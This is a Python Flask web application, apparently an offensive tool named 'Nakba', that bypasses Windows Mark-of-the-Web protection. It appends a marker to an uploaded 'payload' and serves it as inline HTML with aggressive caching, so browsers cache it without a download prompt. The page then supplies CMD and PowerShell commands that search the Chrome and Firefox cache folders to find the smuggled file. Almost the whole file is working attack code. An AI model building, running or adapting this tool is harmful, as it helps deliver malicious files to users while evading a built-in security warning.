import os
import uuid
import html
import mimetypes
import time
from collections import defaultdict
from flask import Flask, request, send_file, render_template_string, make_response

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Rate limiting
request_counts = defaultdict(list)
RATE_LIMIT = 10
RATE_WINDOW = 60

# Limit file size
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

# --- CONFIGURATION ---
SIGNATURE = b"X0X0X_PAYLOAD_MARKER_X0X0X"

# --- HTML INTERFACE ---
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nakba | Bypass MoTW</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#3b82f6', secondary: '#2563eb', dark: '#0f172a', light: '#f9fafb', warning: '#ef4444', info: '#38bdf8',
                        gray: { 50: '#1e293b', 100: '#1e293b', 200: '#334155', 300: '#475569', 400: '#64748b', 500: '#94a3b8', 600: '#cbd5e1', 700: '#e2e8f0', 800: '#f1f5f9', 900: '#f8fafc' }
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); min-height: 100vh; color: #e2e8f0; }
        .bg-gray-50 { background-color: #1e293b !important; color: #e2e8f0; }
        .text-gray-900 { color: #f1f5f9 !important; }
        .text-gray-600 { color: #94a3b8 !important; }
        .text-gray-500 { color: #94a3b8 !important; }
        .text-gray-700 { color: #cbd5e1 !important; }
        .text-primary { color: #60a5fa !important; }
        .bg-white { background-color: #1e293b !important; border: 1px solid #334155; }
        .bg-blue-50 { background-color: #1e3a8a !important; }
        .bg-green-100 { background-color: #166534 !important; }
        .bg-purple-100 { background-color: #4c1d95 !important; }
        .border-gray-200 { border-color: #334155 !important; }
        .border-gray-300 { border-color: #475569 !important; }
        .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 15px 10px -6px rgba(0, 0, 0, 0.3) !important; }
        .gradient-bg { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); }
        .card { box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5); transition: all 0.3s ease; background-color: #1e293b !important; }
        .upload-area { border: 2px dashed #3b82f6; transition: all 0.3s ease; background-color: #0f172a; }
        
        /* DRAG AND DROP FIX */
        .upload-area:hover, .upload-area.dragover { background-color: rgba(59, 130, 246, 0.1); border-color: #2563eb; }
        
        .signature-display { font-family: 'Courier New', monospace; background-color: #0f172a; color: #60a5fa; padding: 10px; border-radius: 6px; border: 1px solid #334155; }
        code { background-color: #0f172a; color: #60a5fa; border: 1px solid #334155; }
    </style>
</head>
<body class="bg-gray-50">
    <nav class="bg-white shadow-sm border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
            <div class="flex items-center">
                <i class="fas fa-shield-alt text-primary text-2xl mr-2"></i>
                <span class="text-xl font-bold text-gray-900">Nakba</span>
            </div>
            <div>
                <a href="#motw-section" class="text-gray-500 hover:text-primary text-sm"><i class="fas fa-book mr-1"></i> MoTW Info</a>
            </div>
        </div>
    </nav>

    <div class="max-w-4xl mx-auto px-4 py-12">
        <div class="text-center mb-12">
            <h1 class="text-4xl font-extrabold text-gray-900 sm:text-5xl mb-4">Bypass MoTW Service</h1>
            <p class="text-gray-600">Upload file &rarr; Get Link &rarr; Retrieve from Cache</p>
        </div>

        <div class="card bg-white rounded-xl p-8 mb-8">
            <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">Deploy Payload</h2>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <div class="upload-area rounded-lg p-8 text-center mb-6" id="drop-zone">
                    <i class="fas fa-cube text-4xl text-primary mb-4"></i>
                    <p class="text-lg font-medium text-gray-700 mb-2" id="file-label">Drop payload here</p>
                    <input type="file" id="file" name="file" required class="hidden">
                    <label for="file" class="cursor-pointer gradient-bg text-white px-6 py-2 rounded-lg inline-block">Select File</label>
                </div>
                <div class="text-center">
                    <button type="submit" class="gradient-bg text-white px-8 py-3 rounded-lg font-bold shadow-lg">Generate Link</button>
                </div>
            </form>
        </div>

        {% if link %}
        <div class="card bg-white rounded-xl p-8 mb-8 border-l-4 border-green-500">
            <h2 class="text-2xl font-bold text-gray-900 mb-4 text-center">Link Ready</h2>
            <div class="bg-gray-50 p-4 rounded mb-4 flex justify-between items-center">
                <span class="text-primary break-all">{{ link }}</span>
                <button onclick="copyToClipboard('{{ link }}')" class="ml-4 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
            </div>
            <p class="text-center text-sm text-gray-500">
                Marker: <span class="signature-display">[Embedded]</span>
            </p>
        </div>
        {% endif %}

        <div class="card bg-white rounded-xl p-8 mb-8">
            <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">Retrieval Commands</h2>
            
            <div class="space-y-4">
                <!-- CMD Chrome -->
                <div class="bg-gray-50 p-4 rounded">
                    <p class="text-xs text-gray-500 mb-1">CMD (Chrome)</p>
                    <div class="flex justify-between">
                        <code id="cmd-cmd-chrome" class="text-sm break-all">Loading...</code>
                        <button onclick="copyToClipboard(document.getElementById('cmd-cmd-chrome').innerText)" class="ml-2 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
                    </div>
                </div>

                <!-- PowerShell Chrome -->
                <div class="bg-gray-50 p-4 rounded">
                    <p class="text-xs text-gray-500 mb-1">PowerShell (Chrome)</p>
                    <div class="flex justify-between">
                        <code id="cmd-ps-chrome" class="text-sm break-all">Loading...</code>
                        <button onclick="copyToClipboard(document.getElementById('cmd-ps-chrome').innerText)" class="ml-2 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
                
                <!-- CMD Firefox -->
                <div class="bg-gray-50 p-4 rounded">
                    <p class="text-xs text-gray-500 mb-1">CMD (Firefox)</p>
                    <div class="flex justify-between">
                        <code id="cmd-cmd-ff" class="text-sm break-all">Loading...</code>
                        <button onclick="copyToClipboard(document.getElementById('cmd-cmd-ff').innerText)" class="ml-2 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
                    </div>
                </div>

                <!-- PowerShell Firefox -->
                <div class="bg-gray-50 p-4 rounded">
                    <p class="text-xs text-gray-500 mb-1">PowerShell (Firefox)</p>
                    <div class="flex justify-between">
                        <code id="cmd-ps-ff" class="text-sm break-all">Loading...</code>
                        <button onclick="copyToClipboard(document.getElementById('cmd-ps-ff').innerText)" class="ml-2 text-gray-400 hover:text-white"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div id="motw-section" class="text-center text-gray-500 text-sm mt-12 pt-8 border-t border-gray-200">
            <p>Nakba | Authorized Use Only</p>
        </div>
    </div>

    <script>
        // OBFUSCATED MARKER
        const marker = String.fromCharCode(88,48,88,48,88,95,80,65,89,76,79,65,68,95,77,65,82,75,69,82,95,88,48,88,48,88);

        // Commands
        const cmdChrome = `findstr /s /i "${marker}" "%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cache\\\\*"`;
        const psChrome = `Get-ChildItem -Path "$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cache" -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "${marker}" -Encoding Byte -List | Select-Object -First 1 Path`;
        const cmdFF = `findstr /s /i "${marker}" "%APPDATA%\\\\Mozilla\\\\*", "%LOCALAPPDATA%\\\\Mozilla\\\\*"`;
        const psFF = `Get-ChildItem -Path "$env:APPDATA\\\\Mozilla", "$env:LOCALAPPDATA\\\\Mozilla" -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "${marker}" -Encoding Byte -List | Select-Object -First 1 Path`;

        // Populate commands on load
        window.addEventListener('DOMContentLoaded', () => {
            if(document.getElementById('cmd-cmd-chrome')) document.getElementById('cmd-cmd-chrome').innerText = cmdChrome;
            if(document.getElementById('cmd-ps-chrome')) document.getElementById('cmd-ps-chrome').innerText = psChrome;
            if(document.getElementById('cmd-cmd-ff')) document.getElementById('cmd-cmd-ff').innerText = cmdFF;
            if(document.getElementById('cmd-ps-ff')) document.getElementById('cmd-ps-ff').innerText = psFF;
        });

        // Copy Function
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                const btn = event.target.closest('button');
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i>';
                setTimeout(() => btn.innerHTML = originalHTML, 1500);
            });
        }

        // DRAG AND DROP LOGIC
        const dropZone = document.getElementById('drop-zone');
        const fileInput = document.getElementById('file');
        const fileLabel = document.getElementById('file-label');

        if (dropZone && fileInput && fileLabel) {
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                dropZone.addEventListener(eventName, preventDefaults, false);
            });

            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }

            ['dragenter', 'dragover'].forEach(eventName => {
                dropZone.addEventListener(eventName, highlight, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                dropZone.addEventListener(eventName, unhighlight, false);
            });

            function highlight(e) {
                dropZone.classList.add('dragover');
            }

            function unhighlight(e) {
                dropZone.classList.remove('dragover');
            }

            dropZone.addEventListener('drop', handleDrop, false);

            function handleDrop(e) {
                const dt = e.dataTransfer;
                const files = dt.files;

                if (files.length > 0) {
                    fileInput.files = files;
                    fileLabel.textContent = files[0].name;
                }
            }

            fileInput.addEventListener('change', function() {
                if (this.files.length > 0) {
                    fileLabel.textContent = this.files[0].name;
                }
            });
        }
    </script>
</body>
</html>'''

def safe_join(base, *paths):
    """Safely join paths to prevent directory traversal."""
    new_path = os.path.normpath(os.path.join(base, *paths))
    if not new_path.startswith(base):
        raise ValueError("Path traversal detected")
    return new_path

def check_rate_limit():
    """Check if the requesting IP has exceeded the rate limit."""
    client_ip = request.remote_addr
    current_time = time.time()

    request_counts[client_ip] = [
        req_time for req_time in request_counts[client_ip]
        if current_time - req_time < RATE_WINDOW
    ]

    if len(request_counts[client_ip]) >= RATE_LIMIT:
        return False
    request_counts[client_ip].append(current_time)
    return True

@app.after_request
def after_request(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

@app.route('/')
def index():
    if not check_rate_limit():
        return "Rate limit exceeded", 429
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload_file():
    if not check_rate_limit():
        return "Rate limit exceeded", 429

    if 'file' not in request.files:
        return "No file uploaded", 400

    file = request.files['file']
    if file.filename == '':
        return "No file selected", 400

    file.seek(0, os.SEEK_END)
    file_length = file.tell()
    if file_length > 50 * 1024 * 1024:
        return "File too large", 400
    file.seek(0)

    file_id = str(uuid.uuid4())
    save_path = safe_join(UPLOAD_FOLDER, file_id)

    try:
        file.save(save_path)
        print(f"[*] File uploaded: {file.filename} -> {save_path}")

        with open(save_path, 'ab') as f:
            f.write(SIGNATURE)
        print(f"[+] Signature appended to file")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return "Internal server error", 500

    link_url = request.host_url + 'f/' + file_id
    safe_link = html.escape(link_url)

    return render_template_string(HTML_TEMPLATE, link=safe_link)

@app.route('/f/<file_id>')
def get_file(file_id):
    try:
        uuid.UUID(file_id)
    except ValueError:
        return "Invalid file ID", 400

    file_path = safe_join(UPLOAD_FOLDER, file_id)

    if not os.path.exists(file_path):
        return "File not found", 404

    # FORCE CONTENT TYPE TO TEXT/HTML
    # By setting the MIME type to text/html, the browser will attempt to RENDER the file
    # in the browser window instead of downloading it. 
    # This ensures the file enters the cache as a resource without triggering a download prompt.
    mime_type = 'text/html'

    try:
        response = make_response(send_file(file_path, mimetype=mime_type, as_attachment=False))
        
        # Aggressive Caching
        response.cache_control.max_age = 31536000
        response.cache_control.public = True
        response.cache_control.immutable = True
        response.set_etag(file_id)
        
        return response
    except Exception:
        return "Internal server error", 500

if __name__ == '__main__':
    print("[*] Server running on http://localhost:8080")
    print("[*] Payloads will now render inline (not download).")
    app.run(host='0.0.0.0', port=8080, debug=False)
